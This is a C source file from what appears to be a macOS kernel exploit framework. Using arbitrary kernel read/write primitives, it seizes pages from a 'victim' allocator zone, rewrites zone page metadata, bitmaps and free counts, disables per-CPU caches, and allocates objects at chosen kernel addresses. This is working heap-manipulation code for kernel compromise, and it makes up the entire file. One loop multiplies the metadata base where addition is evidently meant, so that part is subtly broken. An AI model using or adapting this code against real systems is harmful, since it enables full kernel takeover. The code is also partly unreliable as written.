//
//  util_zalloc.c
//  xe
//
//  Created by admin on 12/8/21.
//

#include <stdlib.h>
#include <unistd.h>

#include <sys/errno.h>

#include "util/zalloc.h"
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "util/misc.h"
#include "util/assert.h"
#include "util/log.h"

#include "macos_params.h"

#define MAX_PAGEQ_LEN 32

struct xe_util_zalloc {
    uintptr_t zone;
    uint32_t pageq[MAX_PAGEQ_LEN];
    size_t pageq_len;
};

uintptr_t xe_util_zalloc_pva_to_addr(uint32_t pva) {
    return (uintptr_t)(int32_t)pva << XE_PAGE_SHIFT;
}

uintptr_t xe_util_zalloc_find_zone_at_index(uint zone_index) {
    return xe_slider_kernel_slide(VAR_ZONE_ARRAY_ADDR) + zone_index * TYPE_ZONE_SIZE;
}

uint xe_util_zalloc_zone_to_index(uintptr_t zone) {
    return (uint)((zone - xe_slider_kernel_slide(VAR_ZONE_ARRAY_ADDR)) / TYPE_ZONE_SIZE);
}

uintptr_t xe_util_zalloc_pageq_to_meta(uint32_t pageq) {
    uintptr_t zi_meta_base = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_INFO_ADDR), TYPE_ZONE_INFO_MEM_ZI_META_BASE_OFFSET) ;
    return zi_meta_base + ((uintptr_t)pageq * TYPE_ZONE_PAGE_METADATA_SIZE);
}

uintptr_t xe_util_zalloc_bitmap_offset_to_ref(uint32_t offset) {
    uintptr_t zone_info = xe_slider_kernel_slide(VAR_ZONE_INFO_ADDR);
    uintptr_t zi_bits_range = zone_info + TYPE_ZONE_INFO_MEM_ZI_BITS_RANGE_OFFSET;
    uintptr_t zba_slot_base = xe_kmem_read_uint64(zi_bits_range, TYPE_ZONE_MAP_RANGE_MEM_MIN_ADDRESS_OFFSET);
    return zba_slot_base + (offset & ~0x7);
}

uint32_t xe_util_zalloc_find_last_secondary_page(uint32_t pageq_primary, uint* num_secondary_pages) {
    uintptr_t meta_primary = xe_util_zalloc_pageq_to_meta(pageq_primary);
    uint16_t zm_index_primary;
    xe_kmem_read_bitfield(&zm_index_primary, meta_primary, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INDEX_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INDEX_BIT_SIZE);
    
    uint idx = 0;
    uint32_t tail = pageq_primary;
    while (1) {
        uint32_t next = xe_kmem_read_uint32(xe_util_zalloc_pageq_to_meta(tail), TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET);
        if (!next) {
            break;
        }
        
        uintptr_t meta = xe_util_zalloc_pageq_to_meta(next);
        
        uint16_t zm_chunk_len;
        xe_kmem_read_bitfield(&zm_chunk_len, meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_SIZE);
        
        if (zm_chunk_len <= 0x8) {
            break;
        }
        
        uint16_t zm_index;
        xe_kmem_read_bitfield(&zm_index, meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INDEX_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INDEX_BIT_SIZE);
        xe_assert(zm_index == zm_index_primary);
        
        idx++;
        tail = next;
    }
    
    if (idx > 0) {
        *num_secondary_pages = idx;
        return tail;
    } else {
        *num_secondary_pages = 0;
        return 0;
    }
}

uint32_t xe_util_zalloc_find_primary_pageq(uint32_t pageq_start, uint max_depth, uint* found_depth, uint* num_secondary_pages) {
    uint32_t cursor = pageq_start;
    uint32_t cursor_secondary_pages = 0;
    uint depth = 0;
    while (depth < max_depth) {
        uint32_t tail = xe_util_zalloc_find_last_secondary_page(cursor, &cursor_secondary_pages);
        uintptr_t meta = xe_util_zalloc_pageq_to_meta(tail ?: cursor);
        uint32_t next = xe_kmem_read_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET);
        if (!next) {
            break;
        }
        cursor = next;
        depth++;
    }
    if (found_depth) *found_depth = depth;
    if (num_secondary_pages) *num_secondary_pages = cursor_secondary_pages;
    return cursor;
}

uintptr_t xe_util_zalloc_find_victim_zone(uint elem_size) {
    uintptr_t victim_zone = 0;
    uint victim_zone_empty_pageq_depth = 0;
    
    for (int i=0; i<VAR_ZONE_ARRAY_LEN; i++) {
        uintptr_t zone = xe_util_zalloc_find_zone_at_index(i);
        if (!xe_kmem_read_uint64(zone, 0)) {
            continue;
        }
        
        _Bool z_percpu;
        xe_kmem_read_bitfield(&z_percpu, zone, TYPE_ZONE_MEM_Z_PERCPU_BITFIELD_OFFSET, TYPE_ZONE_MEM_Z_PERCPU_BITFIELD_SIZE);
        if (z_percpu) {
            continue;
        }
        
        uint16_t z_elem_size = xe_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
        uint16_t z_chunk_pages = xe_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_CHUNK_PAGES_OFFSET);
        
        if (z_elem_size < 16) {
            continue;
        }
        
        if (XE_PAGE_SIZE * z_chunk_pages < elem_size) {
            continue;
        }
        
        uint bitmap_count = (z_chunk_pages * XE_PAGE_SIZE) / z_elem_size;
        uint required_bitmap_count = (z_chunk_pages * XE_PAGE_SIZE) / elem_size;
        if (bitmap_count < required_bitmap_count) {
            continue;
        }
        
        uint32_t pageq_empty = xe_kmem_read_uint32(zone, TYPE_ZONE_MEM_Z_PAGEQ_EMPTY_OFFSET);
        if (!pageq_empty) {
            continue;
        }
        
        uint found_depth;
        xe_util_zalloc_find_primary_pageq(pageq_empty, 10, &found_depth, NULL);
        if (found_depth > victim_zone_empty_pageq_depth) {
            victim_zone = zone;
            victim_zone_empty_pageq_depth = found_depth;
        }
    }
    
    if (victim_zone) {
        return victim_zone;
    }
    
    xe_log_error("[ERROR] failed to find victim zone for elem size %u", elem_size);
    abort();
}

void xe_util_init_bitmap_inline(uintptr_t meta_base, uint32_t elem_size) {
    uint16_t zm_chunk_len;
    xe_kmem_read_bitfield(&zm_chunk_len, meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_SIZE);
    
    uint elements = (zm_chunk_len * XE_PAGE_SIZE) / elem_size;
    for (int i=0; i<zm_chunk_len; i++) {
        uintptr_t meta = meta_base + i * TYPE_ZONE_PAGE_METADATA_SIZE;
        uint batch_size = xe_min(elements, 32);
        uint32_t bitmap = ~0;
        if (batch_size < 32) {
            bitmap &= ((1 << batch_size) - 1);
        }
        xe_kmem_write_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET, bitmap);
        elements -= batch_size;
    }
    xe_assert(elements == 0);
}

void xe_util_init_bitmap_ref(uintptr_t meta_base, uint32_t elem_size) {
    uint16_t zm_chunk_len;
    xe_kmem_read_bitfield(&zm_chunk_len, meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_SIZE);
    uint32_t zm_bitmap = xe_kmem_read_uint32(meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
    
    uintptr_t bitmap_base = xe_util_zalloc_bitmap_offset_to_ref(zm_bitmap);
    uint bitmap_count = 1 << (zm_bitmap & 0x7);
    
    uint elements = (zm_chunk_len * XE_PAGE_SIZE) / elem_size;
    for (int i=0; i<bitmap_count; i++) {
        uint batch_size = xe_min(elements, 64);
        uintptr_t bitmap = bitmap_base + i * 8;
        uint64_t value = ~0ULL;
        if (batch_size < 64) {
            value &= ((1ULL << batch_size) - 1);
        }
        xe_kmem_write_uint64(bitmap, 0, value);
        elements -= batch_size;
    }
    xe_assert(elements == 0);
}

void xe_util_zalloc_init_bitmap(uintptr_t meta, uint elem_size) {
    _Bool zm_inline;
    xe_kmem_read_bitfield(&zm_inline, meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_SIZE);
    if (zm_inline) {
        xe_util_init_bitmap_inline(meta, elem_size);
    } else {
        xe_util_init_bitmap_ref(meta, elem_size);
    }
}

void xe_util_zalloc_change_pageq_owner(uintptr_t meta_head, uint16_t zone_index) {
    uintptr_t cursor = meta_head;
    xe_assert(zone_index < VAR_ZONE_ARRAY_LEN);
    while (cursor) {
        uint16_t bitfields = xe_kmem_read_uint16(cursor, 0);
        uint16_t zm_index_mask = xe_bitfield_mask(TYPE_ZONE_PAGE_METADATA_MEM_ZM_INDEX_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INDEX_BIT_SIZE);
        bitfields = (bitfields & ~zm_index_mask) | ((zone_index << TYPE_ZONE_PAGE_METADATA_MEM_ZM_INDEX_BIT_OFFSET) & zm_index_mask);
        xe_kmem_write_uint16(cursor, 0, bitfields);
        uint32_t next_pageq = xe_kmem_read_uint32(cursor, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET);
        
        uint16_t written;
        xe_kmem_read_bitfield(&written, cursor, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INDEX_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INDEX_BIT_SIZE);
        xe_assert(written == zone_index);
        
        cursor = next_pageq ? xe_util_zalloc_pageq_to_meta(next_pageq) : 0;
    }
}

uint32_t xe_util_zalloc_steal_pageq(uintptr_t recipient_zone, uint elem_size, uint* num_secodary_pages_out) {
    uintptr_t victim_zone = xe_util_zalloc_find_victim_zone(elem_size);
    uint32_t pageq_empty = xe_kmem_read_uint32(victim_zone, TYPE_ZONE_MEM_Z_PAGEQ_EMPTY_OFFSET);
    xe_assert(pageq_empty != 0);
    
    uint num_secondary_pages;
    uint32_t pageq = xe_util_zalloc_find_primary_pageq(pageq_empty, 10, NULL, &num_secondary_pages);
    
    uint32_t pageq_head = pageq;
    uint32_t pageq_tail = pageq + num_secondary_pages;
    
    uintptr_t meta_head = xe_util_zalloc_pageq_to_meta(pageq_head);
    uintptr_t meta_tail = xe_util_zalloc_pageq_to_meta(pageq_tail);
    
    uint32_t prev_pageq = xe_kmem_read_uint32(meta_head, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET);
    uint32_t next_pageq = xe_kmem_read_uint32(meta_tail, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET);
    
    uintptr_t prev_meta = prev_pageq ? xe_util_zalloc_pageq_to_meta(prev_pageq) : 0;
    uintptr_t next_meta = next_pageq ? xe_util_zalloc_pageq_to_meta(next_pageq) : 0;
    
    if (prev_meta && next_meta) {
        xe_kmem_write_uint32(prev_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET, next_pageq);
        xe_kmem_write_uint32(next_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET, prev_pageq);
    } else if (prev_meta) {
        xe_kmem_write_uint32(prev_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET, 0);
    } else if (next_meta) {
        xe_kmem_write_uint32(next_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET, 0);
    }
    
    xe_kmem_write_uint32(meta_head, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET, 0);
    xe_kmem_write_uint32(meta_tail, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET, 0);
    xe_util_zalloc_init_bitmap(meta_head, elem_size);
    xe_util_zalloc_change_pageq_owner(meta_head, xe_util_zalloc_zone_to_index(recipient_zone));
    
    xe_assert(xe_kmem_read_uint16(meta_head, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET) == 0);
    xe_kmem_write_uint16(meta_head, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET, elem_size);
    
    uint16_t z_elem_size = xe_kmem_read_uint16(victim_zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
    uint32_t z_elems_free = xe_kmem_read_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET);
    uint32_t z_elems_avail = xe_kmem_read_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_AVAIL_OFFSET);
    uint32_t elems_lost = ((num_secondary_pages + 1) * XE_PAGE_SIZE) / z_elem_size;
    
    xe_kmem_write_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET, z_elems_free - elems_lost);
    xe_kmem_write_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_AVAIL_OFFSET, z_elems_avail - elems_lost);
    return pageq;
}

size_t xe_util_zalloc_steal_pages(uintptr_t recipient_zone, uint min_num_pages, uint elem_size, uint32_t* pageq, size_t pageq_len) {
    int pages_to_steal = min_num_pages;
    size_t idx = 0;
    while (pages_to_steal > 0 && idx < pageq_len) {
        uint num_secondary_pages = 0;
        uint32_t pageq_head = xe_util_zalloc_steal_pageq(recipient_zone, elem_size, &num_secondary_pages);
        pages_to_steal -= (num_secondary_pages + 1);
        pageq[idx++] = pageq_head;
    }
    xe_assert(pages_to_steal <= 0);
    return idx;
}

xe_util_zalloc_t xe_util_zalloc_create(uintptr_t zone, uint num_pages) {
    xe_assert(xe_kmem_read_uint64(zone, 0) == zone);
    _Bool z_percpu;
    xe_kmem_read_bitfield(&z_percpu, zone, TYPE_ZONE_MEM_Z_PERCPU_BITFIELD_OFFSET, TYPE_ZONE_MEM_Z_PERCPU_BITFIELD_SIZE);
    xe_assert(z_percpu == 0);
    uintptr_t z_pcpu_cache = xe_kmem_read_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET);
    if (z_pcpu_cache) {
        xe_log_info("disabling z_pcpu_cache for zone %p", (void*)zone);
        xe_kmem_write_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET, 0);
    }
    
    uint16_t z_elem_size = xe_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
    xe_util_zalloc_t util = malloc(sizeof(struct xe_util_zalloc));
    util->pageq_len = xe_util_zalloc_steal_pages(zone, num_pages, z_elem_size, util->pageq, xe_array_size(util->pageq));
    util->zone = zone;
    
    return util;
}

int xe_util_zba_scan_bitmap_ref(uintptr_t meta, uint* eidx_out) {
    uint32_t zm_bitmap = xe_kmem_read_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
    uintptr_t bitmaps = xe_util_zalloc_bitmap_offset_to_ref(zm_bitmap);
    uint bitmap_count = 1 << (zm_bitmap & 0x7);
    
    for (uint i=0; i<bitmap_count; i++) {
        uintptr_t bitmap = bitmaps + i * sizeof(uintptr_t);
        uint64_t value = xe_kmem_read_uint64(bitmap, 0);
        if (!value) {
            continue;
        }
        uint idx = __builtin_ctzll(value);
        value ^= (1ULL << idx);
        xe_kmem_write_uint64(bitmap, 0, value);
        *eidx_out = i * 64 + idx;
        return 0;
    }
    
    return ENOENT;
}

int xe_util_zba_scan_bitmap_inline(uintptr_t meta_base, uint* eidx_out) {
    uint8_t zm_chunk_len;
    xe_kmem_read_bitfield(&zm_chunk_len, meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_SIZE);
    xe_assert(zm_chunk_len <= 0x8);
    
    for (int i=0; i<zm_chunk_len; i++) {
        uintptr_t meta = meta_base * i * TYPE_ZONE_PAGE_METADATA_SIZE;
        uint32_t zm_bitmap = xe_kmem_read_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
        if (!zm_bitmap) {
            continue;
        }
        uint idx = __builtin_ctz(zm_bitmap);
        zm_bitmap ^= (1 << idx);
        xe_kmem_write_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET, zm_bitmap);
        *eidx_out = i * 32 + idx;
        return 0;
    }
    
    return ENOENT;
}

int xe_util_meta_find_and_clear_bit(uintptr_t meta, uint* eidx_out) {
    uint16_t zm_inline_bitmap;
    xe_kmem_read_bitfield(&zm_inline_bitmap, meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_SIZE);
    
    if (zm_inline_bitmap) {
        return xe_util_zba_scan_bitmap_inline(meta, eidx_out);
    } else {
        return xe_util_zba_scan_bitmap_ref(meta, eidx_out);
    }
}

void xe_util_zalloc_apply_meta_alloc_size_diff(uintptr_t meta, int diff) {
    uint16_t current = xe_kmem_read_uint16(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET);
    xe_assert(!(diff < 0 && -diff > current));
    xe_kmem_write_uint16(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET, current + diff);
}

uintptr_t xe_util_zalloc_alloc(xe_util_zalloc_t util) {
    uint16_t z_elem_size = xe_kmem_read_uint16(util->zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
    for (size_t i=0; i<util->pageq_len; i++) {
        uint32_t pageq = util->pageq[i];
        uintptr_t meta = xe_util_zalloc_pageq_to_meta(pageq);
        uint eidx = 0;
        int error = xe_util_meta_find_and_clear_bit(meta, &eidx);
        if (!error) {
            xe_util_zalloc_apply_meta_alloc_size_diff(meta, z_elem_size);
            uintptr_t page = xe_util_zalloc_pva_to_addr(pageq);
            return page + eidx * z_elem_size;
        }
    }
    xe_log_error("no memory to allocate");
    abort();
}

int xe_util_zalloc_meta_clear_bitmap_inline(uintptr_t meta_base, int eidx) {
    int meta_idx = eidx / 32;
    uintptr_t meta = meta_base + meta_idx * TYPE_ZONE_PAGE_METADATA_SIZE;
    uint32_t value = xe_kmem_read_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
    int bitmap_idx = eidx % 32;
    if (!(value & (1 << bitmap_idx))) {
        return EALREADY;
    }
    value ^= (1 << bitmap_idx);
    xe_kmem_write_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET, value);
    return 0;
}

int xe_util_zalloc_meta_clear_bitmap_ref(uintptr_t meta_base, int eidx) {
    uint32_t bitmap_offset = xe_kmem_read_uint32(meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
    uintptr_t bitmap_base = xe_util_zalloc_bitmap_offset_to_ref(bitmap_offset);
    int meta_idx = eidx / 64;
    int bitmap_idx = eidx % 64;
    uintptr_t bitmap = bitmap_base + meta_idx * 8;
    uint64_t value = xe_kmem_read_uint64(bitmap, 0);
    if (!(value & (1ULL << bitmap_idx))) {
        return EALREADY;
    }
    value ^= (1ULL << bitmap_idx);
    xe_kmem_write_uint64(bitmap, 0, value);
    return 0;
}

int xe_util_zalloc_meta_clear_bit(uintptr_t meta, int eidx) {
    uint16_t zm_inline_bitmap;
    xe_kmem_read_bitfield(&zm_inline_bitmap, meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_SIZE);
    
    if (zm_inline_bitmap) {
        return xe_util_zalloc_meta_clear_bitmap_inline(meta, eidx);
    } else {
        return xe_util_zalloc_meta_clear_bitmap_ref(meta, eidx);
    }
}

uintptr_t xe_util_zalloc_alloc_at(xe_util_zalloc_t util, uintptr_t address) {
    uint32_t addr_pageq = (uint32_t)(address >> XE_PAGE_SHIFT);
    uint16_t z_elem_size = xe_kmem_read_uint16(util->zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
    
    for (size_t i=0; i<util->pageq_len; i++) {
        uint32_t pageq = util->pageq[i];
        uintptr_t meta = xe_util_zalloc_pageq_to_meta(pageq);
        
        uint16_t zm_chunk_len;
        xe_kmem_read_bitfield(&zm_chunk_len, meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_SIZE);
        
        if (addr_pageq < pageq || addr_pageq >= (pageq + zm_chunk_len)) {
            continue;
        }
        
        uintptr_t page = xe_util_zalloc_pva_to_addr(pageq);
        int eidx = (int)((address - page) / z_elem_size);
        int error = xe_util_zalloc_meta_clear_bit(meta, eidx);
        if (error) {
            xe_log_error("address already in use");
            abort();
        }
        xe_util_zalloc_apply_meta_alloc_size_diff(meta, z_elem_size);
        return 0;
    }
    
    xe_log_error("address not allocated by allocator");
    abort();
}

void xe_util_zalloc_free(xe_util_zalloc_t util, uintptr_t address) {
    xe_log_error("not implemented");
    abort();
}
